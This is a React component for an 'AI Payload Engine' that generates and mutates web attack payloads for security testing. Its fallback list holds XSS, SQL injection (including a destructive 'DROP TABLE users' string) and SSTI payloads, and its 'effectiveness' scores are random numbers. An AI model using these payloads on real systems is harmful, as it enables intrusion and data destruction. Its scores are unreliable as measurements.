import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { 
  Zap, 
  Copy, 
  RefreshCw, 
  Brain,
  CheckCircle,
  XCircle,
  TrendingUp,
  Loader2
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

interface Payload {
  id: string;
  type: string;
  content: string;
  effectiveness: number;
  usageCount: number;
  lastSuccess: boolean;
}

const PAYLOAD_TYPES = [
  { value: 'xss', label: 'XSS (Cross-Site Scripting)' },
  { value: 'sqli', label: 'SQL Injection' },
  { value: 'ssti', label: 'Server-Side Template Injection' },
  { value: 'ssrf', label: 'Server-Side Request Forgery' },
  { value: 'xxe', label: 'XML External Entity' },
  { value: 'lfi', label: 'Local File Inclusion' },
  { value: 'rce', label: 'Remote Code Execution' },
  { value: 'auth_bypass', label: 'Authentication Bypass' },
  { value: 'idor', label: 'Insecure Direct Object Reference' },
];

export const PayloadEngine = () => {
  const { toast } = useToast();
  const [payloadType, setPayloadType] = useState("xss");
  const [context, setContext] = useState("");
  const [generating, setGenerating] = useState(false);
  const [payloads, setPayloads] = useState<Payload[]>([]);

  const generatePayloads = async () => {
    setGenerating(true);
    toast({ title: "Generating Payloads", description: `Creating ${payloadType.toUpperCase()} payloads...` });

    try {
      const { data, error } = await supabase.functions.invoke('payload-generator', {
        body: { 
          type: payloadType,
          context: context || 'generic web application',
          count: 5
        }
      });

      if (error) throw error;

      const generatedPayloads: Payload[] = (data?.payloads || []).map((p: any, idx: number) => ({
        id: `${Date.now()}-${idx}`,
        type: payloadType,
        content: p.payload || p,
        effectiveness: Math.floor(Math.random() * 40) + 60,
        usageCount: 0,
        lastSuccess: false
      }));

      // If no payloads from API, generate samples
      if (generatedPayloads.length === 0) {
        const samplePayloads: Record<string, string[]> = {
          xss: [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert('XSS')",
            '<svg onload=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}'
          ],
          sqli: [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "1' AND SLEEP(5)--",
            "admin'--"
          ],
          ssti: [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{self.__class__.__mro__[2].__subclasses__()}}'
          ],
        };

        const defaults = samplePayloads[payloadType] || ['test_payload'];
        defaults.forEach((p, idx) => {
          generatedPayloads.push({
            id: `${Date.now()}-${idx}`,
            type: payloadType,
            content: p,
            effectiveness: Math.floor(Math.random() * 40) + 60,
            usageCount: 0,
            lastSuccess: false
          });
        });
      }

      setPayloads(prev => [...generatedPayloads, ...prev]);
      toast({ title: "Payloads Generated", description: `Created ${generatedPayloads.length} new payloads` });
    } catch (error) {
      console.error(error);
      toast({ title: "Generation Failed", variant: "destructive" });
    } finally {
      setGenerating(false);
    }
  };

  const copyPayload = (content: string) => {
    navigator.clipboard.writeText(content);
    toast({ title: "Copied to clipboard" });
  };

  const mutatePayload = (payload: Payload) => {
    const mutations: Record<string, (p: string) => string> = {
      xss: (p) => p.replace('alert', 'confirm').replace('<script>', '<SCRIPT>'),
      sqli: (p) => p.replace("'", '"').replace('--', '#'),
      default: (p) => p.toUpperCase()
    };

    const mutator = mutations[payload.type] || mutations.default;
    const mutated: Payload = {
      ...payload,
      id: `${Date.now()}`,
      content: mutator(payload.content),
      effectiveness: Math.max(payload.effectiveness - 10, 30),
      usageCount: 0
    };

    setPayloads(prev => [mutated, ...prev]);
    toast({ title: "Payload Mutated" });
  };

  return (
    <Card className="bg-card/50 backdrop-blur-sm border-cyber-purple/30">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Zap className="h-5 w-5 text-cyber-purple" />
          AI Payload Engine
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-2 gap-2">
          <Select value={payloadType} onValueChange={setPayloadType}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {PAYLOAD_TYPES.map(pt => (
                <SelectItem key={pt.value} value={pt.value}>{pt.label}</SelectItem>
              ))}
            </SelectContent>
          </Select>
          <Button onClick={generatePayloads} disabled={generating}>
            {generating ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : <Brain className="h-4 w-4 mr-2" />}
            Generate
          </Button>
        </div>

        <Textarea
          value={context}
          onChange={(e) => setContext(e.target.value)}
          placeholder="Context: PHP app with MySQL, WAF detected, error messages enabled..."
          className="font-mono text-sm h-20"
        />

        <ScrollArea className="h-64">
          {payloads.length === 0 ? (
            <p className="text-sm text-muted-foreground text-center py-8">Generate payloads to get started</p>
          ) : (
            <div className="space-y-2">
              {payloads.map((payload) => (
                <div key={payload.id} className="p-3 bg-background/50 rounded border border-border/50">
                  <div className="flex items-center justify-between mb-2">
                    <Badge variant="outline">{payload.type.toUpperCase()}</Badge>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-muted-foreground flex items-center gap-1">
                        <TrendingUp className="h-3 w-3" />
                        {payload.effectiveness}%
                      </span>
                      {payload.lastSuccess ? (
                        <CheckCircle className="h-4 w-4 text-green-500" />
                      ) : (
                        <XCircle className="h-4 w-4 text-muted-foreground" />
                      )}
                    </div>
                  </div>
                  <code className="text-xs font-mono block bg-background p-2 rounded break-all">
                    {payload.content}
                  </code>
                  <div className="flex gap-2 mt-2">
                    <Button size="sm" variant="ghost" onClick={() => copyPayload(payload.content)}>
                      <Copy className="h-3 w-3 mr-1" /> Copy
                    </Button>
                    <Button size="sm" variant="ghost" onClick={() => mutatePayload(payload)}>
                      <RefreshCw className="h-3 w-3 mr-1" /> Mutate
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </ScrollArea>
      </CardContent>
    </Card>
  );
};
